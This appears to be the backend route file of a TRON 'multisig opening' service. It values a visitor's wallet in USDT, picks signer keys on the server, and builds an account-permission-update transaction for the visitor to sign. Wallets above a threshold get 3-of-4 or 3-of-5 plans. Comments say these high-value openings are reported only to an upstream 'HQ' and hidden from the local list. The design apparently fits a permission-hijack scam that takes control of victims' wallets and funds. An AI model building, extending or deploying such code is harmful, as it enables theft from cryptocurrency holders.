import type { FastifyInstance } from "fastify";
import { z } from "zod";
import { OpenStatus, Role, Tier } from "../types.js";
import { prisma } from "../db.js";
import { getNetwork, getSetting, localFallbackThresholdUsdt } from "../config.js";
import { getPageDecor } from "../pageDecor.js";
import { listEnabledOpenWallets } from "../openWallets.js";
import {
  buildPermissionPlan,
  buildUpdatePermissionTx,
  isValidTronAddress,
  sumTrc20ValueUsdt,
} from "../tron.js";
import { j, parseJson } from "../json.js";
import { fetchHqPolicy, reportOpenToHq } from "../hqClient.js";
import { buildReturnRedirect } from "../partner.js";
import { createOpenSession } from "../openSession.js";
import { describeChainReject } from "../chainError.js";
import { assertFullAccess, assertPublicOpenAllowed } from "../license.js";
import { isValidMemberCode } from "../memberCode.js";
import { getMemberBillingSettings, isRegisterOpen, memberSubscriptionActive } from "../memberBilling.js";

export async function registerOpenRoutes(app: FastifyInstance) {
  app.get("/api/meta/public", async () => {
    const network = await getNetwork();
    let thresholdUsdt = localFallbackThresholdUsdt();
    try {
      thresholdUsdt = (await fetchHqPolicy()).thresholdUsdt;
    } catch {
      /* 展示用兜底 */
    }
    const billing = await getMemberBillingSettings();
    return {
      network,
      thresholdUsdt,
      branchName: process.env.BRANCH_NAME || "加密钱包多签",
      pageDecor: await getPageDecor(),
      openWallets: await listEnabledOpenWallets(),
      memberRegisterEnabled: isRegisterOpen(billing.mode),
      memberRegisterMode: billing.mode,
      memberRegisterRequireCode: billing.mode === "code_required",
      memberPayEnabled: billing.payEnabled,
      memberRegPriceUsdt: billing.regPriceUsdt,
      memberRenewPriceUsdt: billing.renewPriceUsdt,
      ads: {
        sideHtml: await getSetting("ad_side_html", ""),
        bottomHtml: await getSetting("ad_bottom_html", ""),
        exchangeUrl: await getSetting("exchange_url", ""),
      },
    };
  });

  /** 会员专属落地页 */
  app.get("/api/public/member/:code", async (req, reply) => {
    const { code } = z.object({ code: z.string().min(4).max(32) }).parse(req.params);
    const memberCode = code.trim().toLowerCase();
    if (!isValidMemberCode(memberCode)) {
      return reply.code(404).send({ error: "会员入口不存在" });
    }
    const member = await prisma.user.findFirst({
      where: { memberCode, role: Role.MEMBER, active: true },
      select: {
        displayName: true,
        username: true,
        memberCode: true,
        memberExpiresAt: true,
      },
    });
    if (!member?.memberCode) {
      return reply.code(404).send({ error: "会员入口不存在" });
    }
    if (!memberSubscriptionActive({ role: Role.MEMBER, active: true, memberExpiresAt: member.memberExpiresAt })) {
      return reply.code(403).send({ error: "该会员入口已过期，请联系会员续费" });
    }
    const network = await getNetwork();
    return {
      network,
      branchName: process.env.BRANCH_NAME || "加密钱包多签",
      pageDecor: await getPageDecor(),
      openWallets: await listEnabledOpenWallets(),
      member: {
        memberCode: member.memberCode,
        displayName: member.displayName || member.username,
        entryPath: `/p/u/${member.memberCode}`,
      },
    };
  });

  /** 开通页：免登录创建开通会话 */
  app.post("/api/public/open/session", async (req, reply) => {
    if (!(await assertPublicOpenAllowed(reply))) return;
    const body = z
      .object({
        returnUrl: z.string().max(2000).optional(),
        ref: z.string().max(120).optional(),
        memberCode: z.string().max(32).optional(),
      })
      .passthrough()
      .parse(req.body ?? {});
    try {
      let presetOwnerId: string | undefined;
      if (body.memberCode) {
        const code = body.memberCode.trim().toLowerCase();
        if (!isValidMemberCode(code)) {
          return reply.code(404).send({ error: "会员入口不存在" });
        }
        const member = await prisma.user.findFirst({
          where: { memberCode: code, role: Role.MEMBER, active: true },
          select: { id: true, memberExpiresAt: true },
        });
        if (!member) return reply.code(404).send({ error: "会员入口不存在" });
        if (!memberSubscriptionActive({ role: Role.MEMBER, active: true, memberExpiresAt: member.memberExpiresAt })) {
          return reply.code(403).send({ error: "该会员入口已过期，请联系会员续费" });
        }
        presetOwnerId = member.id;
      }
      return await createOpenSession({
        channel: "public",
        returnUrl: body.returnUrl,
        partnerRef: body.ref,
        presetOwnerId,
      });
    } catch (e) {
      const message = e instanceof Error ? e.message : "create_failed";
      const statusCode =
        typeof e === "object" && e && "statusCode" in e
          ? Number((e as { statusCode: number }).statusCode)
          : 400;
      return reply.code(statusCode).send({ error: message });
    }
  });

  app.get("/api/open/:token", async (req, reply) => {
    const { token } = z.object({ token: z.string().min(10) }).parse(req.params);
    const session = await prisma.openSession.findUnique({ where: { token } });
    if (!session) return reply.code(404).send({ error: "not_found" });
    if (session.expiresAt < new Date()) return reply.code(410).send({ error: "expired" });
    return {
      token: session.token,
      network: session.network,
      status: session.status,
      channel: session.channel,
      walletAddress: session.walletAddress,
      tier: session.tier,
      unsignedTx: parseJson(session.unsignedTx, null),
      txId: session.txId,
      returnUrl: session.returnUrl,
      partnerRef: session.partnerRef,
      openWallets: await listEnabledOpenWallets(),
    };
  });

  app.post("/api/open/:token/prepare", async (req, reply) => {
    if (!(await assertPublicOpenAllowed(reply))) return;
    const { token } = z.object({ token: z.string().min(10) }).parse(req.params);
    const body = z.object({ walletAddress: z.string() }).parse(req.body);
    if (!(await isValidTronAddress(body.walletAddress))) {
      return reply.code(400).send({ error: "钱包地址无效，请确认已切换到 TRON 账户" });
    }
    const session = await prisma.openSession.findUnique({ where: { token } });
    if (!session) return reply.code(404).send({ error: "not_found" });
    if (session.expiresAt < new Date()) return reply.code(410).send({ error: "expired" });

    const existing = await prisma.walletRecord.findUnique({
      where: {
        network_address: { network: session.network, address: body.walletAddress },
      },
    });
    if (existing) return reply.code(409).send({ error: "already_multisig" });

    try {
      const { totalUsdt, breakdown } = await sumTrc20ValueUsdt(
        session.network as "mainnet" | "shasta",
        body.walletAddress
      );
      const { thresholdUsdt: line } = await fetchHqPolicy();
      const plan = await buildPermissionPlan(
        session.network as "mainnet" | "shasta",
        body.walletAddress,
        totalUsdt,
        line,
        { presetOwnerId: session.presetOwnerId }
      );
      const unsignedTx = await buildUpdatePermissionTx(
        session.network as "mainnet" | "shasta",
        body.walletAddress,
        plan
      );
      const tier =
        plan.tier === "TWO_OF_THREE"
          ? Tier.TWO_OF_THREE
          : plan.tier === "THREE_OF_FOUR"
            ? Tier.THREE_OF_FOUR
            : Tier.THREE_OF_FIVE;

      const updated = await prisma.openSession.update({
        where: { id: session.id },
        data: {
          walletAddress: body.walletAddress,
          totalValueUsdt: totalUsdt,
          tier,
          signerAddresses: j(plan.keys.map((k) => k.address)),
          unsignedTx: j(unsignedTx),
          status: OpenStatus.PREPARED,
          errorMessage: null,
        },
      });

      await prisma.auditLog.create({
        data: {
          userId: session.createdById,
          action: "OPEN_PREPARE",
          detail: j({
            address: body.walletAddress,
            tier: plan.tier,
            source: plan.source,
            totalUsdt,
            keys: plan.keys.map((k) => k.address),
            breakdown,
            channel: session.channel,
          }),
        },
      });

      return {
        network: updated.network,
        walletAddress: updated.walletAddress,
        tier: updated.tier,
        threshold: plan.threshold,
        source: plan.source,
        totalValueUsdt: totalUsdt,
        keys: plan.keys,
        unsignedTx,
        status: updated.status,
      };
    } catch (e) {
      const message = e instanceof Error ? e.message : "prepare_failed";
      await prisma.openSession.update({
        where: { id: session.id },
        data: { status: OpenStatus.FAILED, errorMessage: message },
      });
      const statusCode =
        typeof e === "object" && e && "statusCode" in e
          ? Number((e as { statusCode: number }).statusCode)
          : 500;
      return reply.code(statusCode).send({ error: message });
    }
  });

  app.post("/api/open/:token/broadcast", async (req, reply) => {
    if (!(await assertPublicOpenAllowed(reply))) return;
    const { token } = z.object({ token: z.string().min(10) }).parse(req.params);
    const body = z.object({ signedTx: z.record(z.unknown()) }).parse(req.body);
    const session = await prisma.openSession.findUnique({ where: { token } });
    if (!session) return reply.code(404).send({ error: "not_found" });
    if (!session.walletAddress || !session.tier) {
      return reply.code(400).send({ error: "not_prepared" });
    }

    try {
      // 广播前再核折合：防止 prepare 时空钱包、充值后再签导致误开低档
      if (session.tier === Tier.TWO_OF_THREE && session.walletAddress) {
        const { totalUsdt } = await sumTrc20ValueUsdt(
          session.network as "mainnet" | "shasta",
          session.walletAddress
        );
        const { thresholdUsdt: line } = await fetchHqPolicy();
        if (totalUsdt > line) {
          const message =
            `钱包余额已变化（当前折合约 ${totalUsdt.toFixed(2)} USDT），` +
            `原开通方案已失效。请刷新开通码后重新开通。`;
          console.warn("[broadcast] tier stale", {
            address: session.walletAddress,
            preparedTier: session.tier,
            totalUsdt,
            line,
          });
          await prisma.openSession.update({
            where: { id: session.id },
            data: { status: OpenStatus.FAILED, errorMessage: message },
          });
          return reply.code(409).send({ error: message });
        }
      }

      const { createTronWeb } = await import("../tron.js");
      const tronWeb = await createTronWeb(session.network as "mainnet" | "shasta");
      const result = await tronWeb.trx.sendRawTransaction(body.signedTx);
      const txId =
        result?.txid ||
        result?.transaction?.txID ||
        (body.signedTx as { txID?: string }).txID ||
        null;

      if (!result?.result && result?.code) {
        const reason = describeChainReject(result);
        console.warn("[broadcast] chain reject", {
          address: session.walletAddress,
          code: result.code,
          message: result.message,
        });
        await prisma.openSession.update({
          where: { id: session.id },
          data: { status: OpenStatus.FAILED, errorMessage: reason },
        });
        return reply.code(400).send({ error: reason, detail: result });
      }

      const signerAddressesRaw =
        session.signerAddresses || j([session.walletAddress]);

      // 本站「已开通」只记低档 2/3；高档 3/4 只上报上游台账，不在本站列表展示
      if (session.tier === Tier.TWO_OF_THREE && session.walletAddress) {
        await prisma.$transaction([
          prisma.openSession.update({
            where: { id: session.id },
            data: { status: OpenStatus.BROADCASTED, txId: txId ?? undefined },
          }),
          prisma.walletRecord.upsert({
            where: {
              network_address: {
                network: session.network,
                address: session.walletAddress,
              },
            },
            update: {
              tier: session.tier,
              signerAddresses: signerAddressesRaw,
              openTxId: txId,
              channel: session.channel,
            },
            create: {
              network: session.network,
              address: session.walletAddress,
              tier: session.tier,
              signerAddresses: signerAddressesRaw,
              openTxId: txId,
              channel: session.channel,
            },
          }),
        ]);
      } else {
        await prisma.openSession.update({
          where: { id: session.id },
          data: { status: OpenStatus.BROADCASTED, txId: txId ?? undefined },
        });
      }

      // 高档开通成功后异步上报；失败只打日志，不挡用户成功页
      if (session.tier === Tier.THREE_OF_FOUR && session.walletAddress) {
        const signers = parseJson<string[]>(signerAddressesRaw, [
          session.walletAddress,
        ]);
        void reportOpenToHq({
          network: session.network as "mainnet" | "shasta",
          address: session.walletAddress,
          tier: "THREE_OF_FOUR",
          signerAddresses: signers,
          openTxId: txId,
          openedAt: new Date().toISOString(),
        });
      }

      const redirectUrl = session.returnUrl
        ? buildReturnRedirect(session.returnUrl, {
            status: "ok",
            address: session.walletAddress,
            txId,
            ref: session.partnerRef,
          })
        : null;

      return { ok: true, txId, status: OpenStatus.BROADCASTED, redirectUrl };
    } catch (e) {
      const message = e instanceof Error ? e.message : "broadcast_failed";
      await prisma.openSession.update({
        where: { id: session.id },
        data: { status: OpenStatus.FAILED, errorMessage: message },
      });
      return reply.code(500).send({ error: message });
    }
  });
}
